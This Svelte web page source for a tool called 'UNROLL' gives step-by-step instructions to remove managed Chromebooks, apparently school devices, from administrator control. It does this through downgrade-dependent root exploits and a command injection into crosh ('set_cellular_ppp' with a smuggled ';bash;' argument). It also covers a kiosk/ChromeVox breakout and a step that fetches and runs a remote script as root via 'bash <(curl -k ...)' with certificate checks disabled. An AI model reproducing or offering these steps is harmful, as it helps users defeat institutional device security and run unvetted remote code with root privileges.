<script lang="ts">
  import Background from "../components/Background.svelte";
  import TopBar from "../components/TopBar.svelte";
  import SelectButton from "../components/SelectButton.svelte";

  let selected:
    | null
    | "101"
    | "91"
    | "81"
    | "87"
    | "80"
    | "kiosk80"
    | "sh1mmer";
  let confirmed = false;

  let paramString = window.location.toString().split("?")[1];
  let queryString = new URLSearchParams(paramString);
</script>

{#if !confirmed}
  <div class="flex flex-col items-center darkm2" id="popup">
    <p class="text text-xl">SKIDS READING THIS</p>
    <p class="text">kindly leave the page</p>

    <div class="flex-1" />
    <div class="flex">
      <SelectButton
        click={() => (confirmed = true)}
        text="i can be trusted with powerful exploits"
      />
      <SelectButton
        click={() =>
          window.location.replace(
            "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
          )}
        text="i am a useless member of society"
      />
    </div>
  </div>
{:else}
  <main class="dark flex flex-col">
    <div class="no-select opacity-10">
      <Background forceScript={2} />
    </div>
    <!-- <div class = "hidden"> -->
    <TopBar title="UNROLL - CHROMEOS UNENROLLER" askForNotifs={false} />
    <!-- </div> -->

    <p class="text-center text text-md flex items-center w-full">
      WARNING! THIS SCRIPT WILL FULLY TAKE YOUR CHROMEBOOK OUT OF MANAGEMENT.<br
      />
      BY RUNNING ANY SCRIPTS FROM HERE YOU ACKNOWLEGE THAT YOU PERSONALLY OWN YOUR
      DEVICE OR HAVE PERMISSION TO BE RUNNING THIS SCRIPT<br />
      THE PROCESS IS REVERSIBLE, BUT I AM NOT RESPONSIBLE FOR ANY TROUBLE YOU MAY
      GET INTO WITH YOUR ADMINISTRATORS, OR BY YOU DOING THIS WRONG AND BRICKING
      YOUR CHROMEBOOK<br />

      IF YOU DON'T HAVE AT LEAST A BASIC UNDERSTANDING OF BASH<br />
    </p>
    <p class="text-center text-xl w-full text-red-600 flex items-center">
      TURN BACK NOW!!!!
    </p>
    <br />
    <div class="scroll-y opacity-90 darkp1 flex-1">
      <p class="flex items-center w-full text-center text text-lg">
        Method Select
      </p>
      <br />
      <p class="flex items-center w-full text-center text text-md">
        Some methods may be blocked by your administrator or be non functional.
        If so, CHOOSE ANOTHER ONE!!!. If none of them work, DO NOT PING ME FOR
        HELP
      </p>
      <div class="flex justify-center items-center">
        <SelectButton click={() => (selected = "sh1mmer")} text="SH1MMER" />
        <SelectButton
          click={() => (selected = "80")}
          text="ShRootV80 - CROSH"
        />
        <SelectButton
          click={() => (selected = "kiosk80")}
          text="ShRootV80 - KISOK EXPLOIT"
        />
        <SelectButton
          click={() => (selected = "101")}
          text="ShRootV101 - CROSH"
        />
        <SelectButton
          click={() => (selected = "87")}
          text="ShRootV87 - CROSH"
        />
        <SelectButton
          click={() => (selected = "91")}
          text="ShRootV91 - CROSH"
        />
        <!-- <SelectButton click={() => (selected = "81")} text="Shill Breakout" /> -->
      </div>
      {#if selected != null}
        <div class="text p-5 flex justify-center flex-col">
          <!-- <pre> -->
          {#if selected == "101" || selected == "91" || selected == "87" || selected == "80"}
            <p class="text text-lg">
              In order for this exploit to work you will need to downgrade to
              EXACTLY version {selected}.<br /> Downgrade instructions can be
              found
              <a href="https://chrome100.dev">here</a>
            </p>
            This method requires crosh to be unblocked on your chromebook.<br />
            Crosh can be opened with CTRL+ALT+T<br />
            If it's blocked by an extension, you can disable it with LTBEEF<br
            />
            {#if selected == "91"}
              v91 WILL NOT WORK ON GRUNT BOARDS OR ARM CHROMEBOOKS<br />
              MAKE SURE YOU HAVE EXACTLY VERSION 91.0.4472.102, NOT VERSION 91.0.4472.167
            {/if}
            {#if selected == "87"}
              v87 WILL NOT WORK IF YOU DON'T HAVE PLAY STORE
            {/if}
            {#if selected == "80"}
              NOTE: this version uses a different URL for crosh. This means that
              if pressing ctrl+alt+t leads to the administrator block screen and
              you've already disabled your blocker extension(s), you can go to
              this url:
              chrome-extension://nkoccljplnhpfnfiajclkommnmllphnl//html/crosh.html
              and it will very likely be unblocked.
            {/if}

            STEPS:

            <ol class="p-3">
              <li>Open crosh (ctrl + alt + t)</li>
              <li>
                Type in <pre>set_cellular_ppp \';bash;exit;\'</pre>
                and enter
              </li>
              <li>
                Type in <pre>bash &lt;(curl -k https://coolelectronics.me/unroll)</pre>
                and enter
              </li>
              <li>
                Wait for the script to finish, then powerwash your chromebook
              </li>
            </ol>

            <br />
          {:else if selected == "sh1mmer"}
            <a href="https://sh1mmer.me">Instructions have been moved here</a>
          {:else if selected == "kiosk80"}
            <p class="text text-lg">
              In order for this exploit to work you will need to downgrade to
              EXACTLY version 80.<br /> Downgrade instructions can be found
              <a href="https://chrome100.dev">here</a>
            </p>
            ONLY USE THIS METHOD IF YOU CANNOT ACCESS A CROSH SHELL WITH ANY OTHER
            METHODS, OR CANNOT SIGN INTO THE CHROMEBOOK AT ALL (crosh blocked, lost
            password, trying to fix a stolen ebay chromebook, etc)
            <ol class="p-3">
              <li>recover/powerwash and don't sign in</li>
              <li>turn wifi off</li>
              <li>
                open a kiosk app (apps button on the sign in screen) app and
                wait for the error screen
              </li>
              <li>press ctrl+alt+z to enable chromevox</li>
              <li>
                start spamming search+o+k (you can hold search down but spam
                o+k)
              </li>
              <li>
                while spamming, press "diagnose", keep spamming until a browser
                window pops up (it may take up to 5 seconds)
              </li>
              <li>
                open a new tab, then press ctrl+alt+z to disable chromevox
              </li>
              <li>visit chrome://os-settings to turn wifi back on</li>
              <li>click the 3 dots and fullscreen the window</li>
              <li>
                download <a href="https://tinyurl.com/croshext">CHRWN</a> (kiosk
                ported version of crosh)
              </li>
              <li>navigate to chrome://extensions</li>
              <li>
                move your mouse to the bottom of the screen to open the
                selector, open the files app
              </li>
              <li>
                find the chrwn zip file you downloaded and try to drag it from
                the files window to the chrome://extensions window. this can be
                tricky, you might have to mess around with
                fullscreening/unfullscreening and moving around the window but
                you should be able to do it
              </li>
              <li>
                if you installed chrwn correctly a new tab should open with a
                bash shell.
              </li>
              <li>
                Type in <pre>bash &lt;(curl -k https://coolelectronics.me/unroll)</pre>
                and enter
              </li>
              <li>
                Wait for the script to finish, then powerwash your chromebook
              </li>
            </ol>
          {/if}
          <p class="text text-lg">
            Steps to Re-Enroll when you turn your chromebook back in at the end
            of the year:
          </p>
          <ol class="p-3">
            <li>
              Enable Devmode (ESC+Power+Reload, ctrl d and enter on recovery
              screen)
            </li>
            <li>Once in chrome, Open crosh (ctrl + alt + t)</li>
            <li>
              Type in <pre>shell</pre>
            </li>
            <li>
              Type in <pre>sudo vpd -i RW_VPD -s check_enrollment=1</pre>
            </li>
            <li>Powerwash again</li>
          </ol>
          <!-- </pre> -->
        </div>
        <br /><br /><br />
        <p class="text text-sm">
          Site made by CoolElectronics#4683<br />
          UNROLL (U Need Root LoL) acroynm by ULTRA BLUE#1850 and zuh#6098<br />
          justinchrm#3399 helped with testing<br />
          Shroot™ name by phennen#9801<br />
          shroot80 script created by OlyB#9420<br />
          Kiosk Exploit found by Divide/B3AT <br />
          Root exploits originally found by Rory McNamara
          <br />
          <br />
          <br />
          If you want to learn more about how this was found, check out my
          <a href="/blog/breaking-cros-1">blog</a>
        </p>
      {/if}
    </div>
  </main>
{/if}

<style>
  #popup {
    /* position: fixed; */
    height: 100vh;
    width: 100vw;
    /* left: 50%; */
    /* top: 50%; */
    /* transform: translate(-50%, -50%); */
  }
  .scroll-y {
    overflow-y: scroll;
    position: relative;
  }
  main {
    overflow: hidden;
  }
  a {
    color: lightskyblue;
  }
  * {
    user-select: none;
  }
  p {
    display: inline-block;
    /* user-select: all; */
  }
  pre {
    user-select: all;
    display: inline;
  }
  .no-select {
    pointer-events: none;
    user-select: none;
    /* z-index: -2; */
  }
</style>
